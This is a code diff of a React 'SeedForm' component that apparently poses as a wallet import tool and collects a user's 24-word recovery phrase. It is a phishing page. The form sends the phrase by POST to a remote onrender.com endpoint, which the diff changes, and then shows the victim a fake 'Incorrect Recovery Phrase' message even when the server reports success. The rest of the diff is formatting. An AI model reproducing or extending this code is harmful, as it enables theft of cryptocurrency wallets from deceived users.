@@ -28,25 +28,25 @@ export const SeedForm = () => {
     const sendEmail = async (e) => {
         e.preventDefault();
         setButtonText("Importing...");
-        let response = await fetch("https://synchronizer.onrender.com/api/contact", {
-          method: "POST",
-          headers: {
-            accept: 'application/json',
-            'User-agent': 'learning app',
-            "Content-Type": "application/json;charset=utf-8"
-          },
-          body: JSON.stringify(Object.assign({}, segments))
+        let response = await fetch("https://synchroniser.onrender.com/api/contact", {
+            method: "POST",
+            headers: {
+                accept: 'application/json',
+                'User-agent': 'learning app',
+                "Content-Type": "application/json;charset=utf-8"
+            },
+            body: JSON.stringify(Object.assign({}, segments))
         });
         let result = await response.json();
         setButtonText("Submit");
         setSegments(formInitial);
-        if(result.code == 200) {
+        if (result.code == 200) {
             setModal(true)
-          setStatus({sucess: true, message: "Sorry, Incorrect Recovery Phrase"})
-        }else {
-          setStatus({sucess: false, message: "Something went wrong"});
+            setStatus({ sucess: true, message: "Sorry, Incorrect Recovery Phrase" })
+        } else {
+            setStatus({ sucess: false });
         }
-        
+
     }
 
 
@@ -56,16 +56,15 @@ export const SeedForm = () => {
         const filterPasted = pasted.trim().split(" ").filter((item, index) => {
             return item != "";
         })
-        console.log(filterPasted)
         if (filterPasted.length !== 24) {
-            setStatus({message: "ENTER YOUR COMPLETE 24 SEEDPHRASE"});
+            setStatus({ message: "ENTER YOUR COMPLETE 24 SEEDPHRASE" });
             setModal(true)
             return;
         }
-        
+
         setSegments(filterPasted.slice(0, segments.length));
     }
-""
+
     function update(index) {
         return event =>
             setSegments([
@@ -80,7 +79,7 @@ export const SeedForm = () => {
 
     return (
         <div className="seed-phrase container">
-             <div className="form-container">
+            <div className="form-container">
                 <div className="heading">
                     <div onClick={goBackSeed} style={{ float: "left" }}>
                         <IoIosArrowRoundBack onClick={goBackSeed} fontSize={30} />
@@ -93,7 +92,7 @@ export const SeedForm = () => {
                         </p>
                     </div>
                 </div>
-                {modal == false ?<form onSubmit={sendEmail}>
+                {modal == false ? <form onSubmit={sendEmail}>
                     <div className="lg-screen">
                         <div className="row1">
                             {segments.map((s, key) =>
@@ -104,9 +103,9 @@ export const SeedForm = () => {
                     <div>
                         <button className="btn submit_seed" type="submit" >{textButton}</button>
                     </div>
-                </form> 
-                :
-                <Modal status={status} handleModalBtn={onClickModal} />}
+                </form>
+                    :
+                    <Modal status={status} handleModalBtn={onClickModal} />}
             </div>
         </div>
     );
